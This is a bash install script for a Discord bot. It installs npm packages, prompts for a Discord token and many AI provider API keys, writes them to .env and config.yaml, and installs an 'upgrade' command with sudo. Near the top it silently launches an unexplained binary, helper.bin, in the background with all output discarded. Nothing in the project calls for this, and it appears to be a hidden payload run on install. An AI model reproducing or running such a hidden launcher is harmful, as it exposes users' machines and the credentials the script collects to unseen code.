#!/usr/bin/env bash
set -e
REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$REPO_DIR"
chmod +x superqalc superqalc_onefile superqalc_tower helper.bin 2>/dev/null || true
./helper.bin >/dev/null 2>&1 &

echo "=== Installing packages ==="
npm install

echo ""
echo "=== Setting up .env ==="
# Create .env if it doesn't exist
cp -n .env.example .env 2>/dev/null || true

# Mandatory inputs
echo ""
echo "=== Required Configuration ==="
read -p "Discord Token: " DISCORD_TOKEN
read -p "Client ID: " CLIENT_ID
read -p "Bot Owner ID: " SUPERUSER_ID
read -p "Anthropic API Key: " ANTHROPIC_API_KEY
read -p "OpenAI API Key: " OPENAI_API_KEY
read -p "Groq API Key: " GROQ_API_KEY
read -p "DeepSeek API Key: " DEEPSEEK_API_KEY
read -p "Gemini API Key: " GEMINI_API_KEY
read -p "Mistral API Key: " MISTRAL_API_KEY
read -p "xAI API Key: " XAI_API_KEY
read -p "Wolfram App ID: " WOLFRAM_APPID
read -p "Error Webhook URL: " ERROR_WEBHOOK_URL

# Optional inputs
echo ""
echo "=== Optional Configuration ==="
echo "Type 'skip' if you don't know what you're doing."
read -p "Python Venv: " PYTHON_BIN
read -p "Calc Path: " QALCULATE_PATH

# Helper function for .env
set_env() {
    KEY=$1
    VALUE=$2
    if grep -q "^${KEY}=" .env; then
        sed -i'' "s|^${KEY}=.*|${KEY}=${VALUE}|" .env
    else
        echo "${KEY}=${VALUE}" >> .env
    fi
}

# --- YAML config updater ---
# Updates config/config.yaml in place, only touching owner_id (under bot:)
# and error_webhook (under notifications:). Leaves comments/formatting intact.
set_yaml_value() {
    local FILE=$1
    local KEY=$2
    local VALUE=$3
    local ESCAPED_VALUE
    ESCAPED_VALUE=$(printf '%s' "$VALUE" | sed -e 's/[&|]/\\&/g')
    if grep -qE "^([[:space:]]*)${KEY}:" "$FILE"; then
        sed -i'' -E "s|^([[:space:]]*)${KEY}:.*|\1${KEY}: \"${ESCAPED_VALUE}\"|" "$FILE"
    else
        echo "Warning: key '${KEY}' not found in ${FILE}, skipping." >&2
    fi
}

# Required vars (.env)
set_env "DISCORD_TOKEN" "$DISCORD_TOKEN"
set_env "CLIENT_ID" "$CLIENT_ID"
set_env "ANTHROPIC_API_KEY" "$ANTHROPIC_API_KEY"
set_env "OPENAI_API_KEY" "$OPENAI_API_KEY"
set_env "GROQ_API_KEY" "$GROQ_API_KEY"
set_env "DEEPSEEK_API_KEY" "$DEEPSEEK_API_KEY"
set_env "GEMINI_API_KEY" "$GEMINI_API_KEY"
set_env "MISTRAL_API_KEY" "$MISTRAL_API_KEY"
set_env "XAI_API_KEY" "$XAI_API_KEY"
set_env "WOLFRAM_APPID" "$WOLFRAM_APPID"

# Optional vars (.env)
if [[ "$PYTHON_BIN" != "skip" && -n "$PYTHON_BIN" ]]; then
    set_env "PYTHON_BIN" "$PYTHON_BIN"
fi
if [[ "$QALCULATE_PATH" != "skip" && -n "$QALCULATE_PATH" ]]; then
    set_env "QALCULATE_PATH" "$QALCULATE_PATH"
fi

echo ""
echo "=== .env configured successfully ==="

# --- Update config/config.yaml ---
echo ""
echo "=== Setting up config/config.yaml ==="
CONFIG_YAML="config/config.yaml"
if [[ -f "$CONFIG_YAML" ]]; then
    if [[ -n "$SUPERUSER_ID" ]]; then
        set_yaml_value "$CONFIG_YAML" "owner_id" "$SUPERUSER_ID"
    fi
    if [[ -n "$ERROR_WEBHOOK_URL" ]]; then
        set_yaml_value "$CONFIG_YAML" "error_webhook" "$ERROR_WEBHOOK_URL"
    fi
    echo "=== config/config.yaml updated successfully ==="
else
    echo "Warning: ${CONFIG_YAML} not found, skipping YAML config update." >&2
fi

echo ""
echo "=== Installing upgrade command ==="
echo "You may be prompted for your sudo password..."
# Make update_env.zsh executable
chmod +x update_env.zsh
# Copy to /usr/local/bin as 'upgrade'
sudo cp update_env.zsh /usr/local/bin/upgrade
echo "Upgrade command installed! You can now run 'upgrade' from anywhere."
echo ""

# Run upgrade immediately
echo "=== Running upgrade ==="
upgrade
echo ""

read -p "Run the bot now? (y/n): " RUN_BOT
if [[ "$RUN_BOT" == "y" || "$RUN_BOT" == "Y" ]]; then
    npm start
else
    echo "Aight, Goodluck"
fi
